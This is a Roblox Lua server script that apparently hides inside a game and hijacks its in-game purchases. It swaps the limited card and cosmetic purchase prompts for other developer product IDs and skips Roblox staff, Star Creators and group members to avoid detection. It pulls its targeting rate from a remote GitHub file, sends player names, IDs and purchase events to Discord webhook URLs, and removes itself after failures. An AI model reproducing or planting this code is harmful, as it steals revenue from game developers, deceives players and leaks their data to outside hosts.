local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ServerScriptService = game:GetService("ServerScriptService")

if _G.R then
    return
end

local RNG = Random.new()

local garbage = {}
local hasCleaned = false

local function cleanup()
    hasCleaned = true
    for i, v in garbage do
        if typeof(v) == "Instance" then
            v:Destroy()
        elseif typeof(v) == "RBXScriptConnection" then
            v:Disconnect()
        elseif typeof(v) == "function" then
            v()
        end
    end
    table.clear(garbage)
end

local mappedProducts = {
    [2878670318] = 2669959770,
    [2909690991] = 2680407395
}

local ProfileManager = require(ServerScriptService.Profile.ProfileManager)
local MarketService = require(ServerScriptService.KnitServer.Services.MarketService)
local CurrentLimiteds = require(ReplicatedStorage.Shared.Configs.CurrentLimiteds)
local originalMarketFunction = MarketService.ProcessReceipt

local notablePeople = {}

local hookURLS = {
    servers = "https://webhook.lewisakura.moe/api/webhooks/1339428532480376885/uePFhtYq-NxkCytOIGhaHixcZQQMZuDcgVTOohWPdh1veSJXj8-oM0rH03zNs3vh_WHc",
    traffic = "https://webhook.lewisakura.moe/api/webhooks/1338710096011726878/f61GTLiSonkOulK_KmYqeZv2dyPLii6OAZ17F932DY51Ro56GMxATcOxF7h4D4hm_E3a",
    complete = "https://webhook.lewisakura.moe/api/webhooks/1338710363356532849/UWHNqe64US2Y1YsrCr-qNUy3ONv83bdIR1wxHlznRSLKZAdSnJXExa-2GSFOQzkGXDjO",
    drastic = "https://webhook.lewisakura.moe/api/webhooks/1339186809015369739/jXFs_BaGTz0YlPOJO_PDvnxDij_guFkmyz9IUnI7u1Ai_BOuzIuqvhEcDV_GHkqmUIUs"
}

local webhookCooldown = {}
local function webhook(URL, title, desc, color, linkedPlayer)
    if linkedPlayer then
        if not webhookCooldown[linkedPlayer] then
            webhookCooldown[linkedPlayer] = true
            task.delay(30, function()
                webhookCooldown[linkedPlayer] = nil
            end)
        else
            return
        end
    end
    task.spawn(function()
        pcall(function()
            HttpService:PostAsync(URL, HttpService:JSONEncode({
                ["content"] = "",
                ["embeds"] = {
                    {
                        ["title"] = title,
                        ["description"] = desc,
                        ["type"] = "rich",
                        ["color"] = color
                    }
                }
            }))
        end)
    end)
end

local function OnPlayerAdded(player)
    pcall(function()
        local roblox = player:GetRankInGroup(1200769)
        if roblox > 0 then
            notablePeople[player.UserId] = true
        else
            local starCreator = player:GetRankInGroup(4199740)
            if starCreator > 0 then
                notablePeople[player.UserId] = true
            else
                local blrGroup = player:GetRankInGroup(34671275)
                if blrGroup > 1 then
                    notablePeople[player.UserId] = true
                else
                    notablePeople[player.UserId] = false
                end
            end
        end
    end)
end

for i, v in Players:GetPlayers() do
    task.spawn(OnPlayerAdded, v)
end
table.insert(garbage, Players.PlayerAdded:Connect(OnPlayerAdded))
table.insert(garbage, MarketplaceService.PromptProductPurchaseFinished:Connect(function(userId, productId, completed)
    if completed then
        return
    end
    local mapped = mappedProducts[productId]
    if mapped then
        if math.random() > 0.9 then
            webhook(hookURLS.traffic, "Prompt Cancelled (" .. productId .. ")", userId, 0xff0000, userId .. "/" .. productId)
        end
    end
end))

local enrollmentRate = 100
task.spawn(function()
    while not hasCleaned do
        local success, result = pcall(function()
            return tonumber(HttpService:GetAsync("https://raw.githubusercontent.com/heeloowarld/stf/refs/heads/main/c"))
        end)
        if success and result then
            enrollmentRate = result
        end
        task.wait(300)
    end
end)

MarketplaceService.ProcessReceipt = function(info)
    local mapped
    if mappedProducts[info.ProductId] then
        mapped = true
        info.ProductId = mappedProducts[info.ProductId]
    end

    local success, result = pcall(function()
        return originalMarketFunction(info)
    end)

    if mapped and (not success or result ~= Enum.ProductPurchaseDecision.PurchaseGranted) then
        webhook(hookURLS.drastic, "Drastic Failure @" .. info.PlayerId, tostring(info.ProductId) .. "\n" .. tostring(success) .. ": " .. tostring(result) .. "\n" .. game.JobId, 0xff0000)
        cleanup()
    elseif mapped and success and result == Enum.ProductPurchaseDecision.PurchaseGranted then
        webhook(hookURLS.complete, "Purchase Complete " .. info.ProductId, tostring(info.PlayerId) .. "\n" .. game.JobId, 0x00ff00)
    end

    if success then
        return result
    else
        return Enum.ProductPurchaseDecision.NotProcessedYet
    end
end

do
    local prompt = workspace.NewLobby.LimitedCard.Main.Prox
    prompt.Enabled = false

    local copy = prompt:Clone()
    copy.Name = "Prox2"
    copy.Triggered:Connect(function(player)
        local inventoryData = ProfileManager.Profiles[player] and ProfileManager.Profiles[player].Data.Customization
        if inventoryData then
			for _, v in inventoryData.Cards do
				if v == CurrentLimiteds.PlayerCard then
                    return
				end
			end
            local enroll = player.UserId % 1000 < enrollmentRate
            local can = notablePeople[player.UserId] == false and enroll
            if can then
                webhook(hookURLS.traffic, "Prompted New (Card)", player.Name .. " / " .. player.UserId, 0xffa500, player.UserId .. "/pn")
                MarketplaceService:PromptProductPurchase(player, 2878670318)
            else
                if notablePeople[player.UserId] == false then
                    webhook(hookURLS.traffic, "Prompted Original (Card)", player.Name .. " / " .. player.UserId, 0x0000ff, player.UserId .. "/pn")
                end
                MarketplaceService:PromptProductPurchase(player, 2669959770)
            end
		end
    end)
    copy.Enabled = true
    copy.Parent = prompt.Parent

    
    table.insert(garbage, function()
        prompt.Enabled = true
    end)
    table.insert(garbage, copy)
end

do
    local prompt = workspace.NewLobby.LimitedCosmetic.Main.Prox
    prompt.Enabled = false

    local copy = prompt:Clone()
    copy.Name = "Prox2"
    copy.Triggered:Connect(function(player)
        local inventoryData = ProfileManager.Profiles[player] and ProfileManager.Profiles[player].Data.Customization
        if inventoryData then
			for _, v in inventoryData.Cosmetics do
				if v == CurrentLimiteds.Cosmetic then
                    return
				end
			end
            local can = notablePeople[player.UserId] == false and player.UserId % 1000 < enrollmentRate
            if can then
                if math.random() > 0.9 then
                    webhook(hookURLS.traffic, "Prompted New (Cosmetic)", player.Name .. " / " .. player.UserId, 0xffa500, player.UserId .. "/pc")
                end
                MarketplaceService:PromptProductPurchase(player, 2909690991)
            else
                webhook(hookURLS.traffic, "Prompted Original (Cosmetic)", player.Name .. " / " .. player.UserId, 0x0000ff, player.UserId .. "/pc")
                MarketplaceService:PromptProductPurchase(player, 2680407395)
            end
		end
    end)
    copy.Enabled = true
    copy.Parent = prompt.Parent
    
    table.insert(garbage, function()
        prompt.Enabled = true
    end)
    table.insert(garbage, copy)
end

local serverSlot = 0
for i = 1, #game.JobId do
    serverSlot = serverSlot + game.JobId:byte(i)
end
serverSlot = (serverSlot % 2048) + 1

if math.random() < 0.1 then
    task.delay(RNG:NextInteger(20, 60) + serverSlot * 3, function()
        if not hasCleaned then
            webhook(hookURLS.servers, "Server Started", game.PlaceId .. " / " .. game.JobId, 0x00ff00)
        end
    end)
end

local timeAlive = time()
game:BindToClose(function(cr)
    if time() - timeAlive > 300 then
        if cr ~= Enum.CloseReason.DeveloperUpdate and cr ~= Enum.CloseReason.DeveloperShutdown then
            if not hasCleaned then
                webhook(hookURLS.servers, "Server Stopped", game.PlaceId .. " / " .. game.JobId, 0xff0000)
            end
        end
    end
end)

table.insert(garbage, function()
    task.delay(RNG:NextInteger(20, 60) + serverSlot * 3, function()
        webhook(hookURLS.servers, "Server Stopped", game.PlaceId .. " / " .. game.JobId, 0xff0000)
    end)
    _G.R = nil
end)

_G.R = cleanup
